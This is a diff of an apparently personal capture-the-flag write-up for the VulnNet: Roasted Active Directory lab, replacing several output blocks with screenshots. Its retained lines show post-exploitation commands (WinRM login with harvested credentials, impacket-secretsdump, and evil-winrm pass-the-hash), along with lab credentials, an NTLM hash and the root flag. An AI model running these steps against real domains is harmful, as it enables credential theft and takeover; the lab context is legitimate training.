@@ -15,6 +15,8 @@ classes: wide
 
 ---
 
+##NOTE: AT SOME POINT IN TIME THE MACHINE STOPPED SO I HAD TO RESET AND GOT A NEW IP ADDR.
+
 ## Overview
 
 VulnNet: Roasted — the name is basically a roadmap. Two Kerberos attacks,
@@ -291,14 +293,7 @@ A password reset script sitting in SYSVOL.
 Something that *shouldn't* be there.
 Can you guess what's inside? 😄
 
-```bash
-cat vulnnet-rst.local/scripts/ResetPassword.vbs
-```
-
-```vb
-strUserNTName = "a-whitehat"
-strPassword = "bNdKVkjv3RR9ht"
-```
+![ResetPassword.vbs credentials](/assets/images/v8.png)
 
 Plain text credentials for **a-whitehat** sitting in a file
 readable by every domain user on the network.
@@ -316,7 +311,7 @@ nxc winrm 10.81.174.210 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'
 ```
 WINRM  10.81.174.210  5985  WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
 ```
-
+![a-whitehat Pwn3d](/assets/images/v9.png)
 `(Pwn3d!)` — domain admin level access.
 
 ### Secretsdump
@@ -325,16 +320,7 @@ WINRM  10.81.174.210  5985  WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bN
 impacket-secretsdump vulnnet-rst.local/a-whitehat:'bNdKVkjv3RR9ht'@10.81.174.210
 ```
 
-```
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
-vulnnet-rst.local\enterprise-core-vn:1104:...:8752ed9e26e6823754dce673de76ddaf:::
-vulnnet-rst.local\a-whitehat:1105:...:1bd408897141aa076d62e9bfc1a5956b:::
-vulnnet-rst.local\t-skid:1109:...:49840e8a32937578f8c55fdca55ac60b:::
-vulnnet-rst.local\j-goldenhand:1110:...:1b1565ec2b57b756b912b5dc36bc272a:::
-vulnnet-rst.local\j-leet:1111:...:605e5542d42ea181adeca1471027e022:::
-```
+![Domain hash dump](/assets/images/v12.png)
 
 Full domain hash dump. Administrator NTLM: `c2597747aa5e43022a3a3049a3c3b09d`
 
@@ -346,10 +332,7 @@ Full domain hash dump. Administrator NTLM: `c2597747aa5e43022a3a3049a3c3b09d`
 evil-winrm -i 10.81.174.210 -u 'Administrator' -H 'c2597747aa5e43022a3a3049a3c3b09d'
 ```
 
-```powershell
-*Evil-WinRM* PS C:\Users\Administrator\Desktop> type system.txt
-THM{16f45e3934293a57645f8d7bf71d8d4c}
-```
+![Root flag](/assets/images/v13.png)
 
 **Root Flag:** `THM{16f45e3934293a57645f8d7bf71d8d4c}` ✅
 
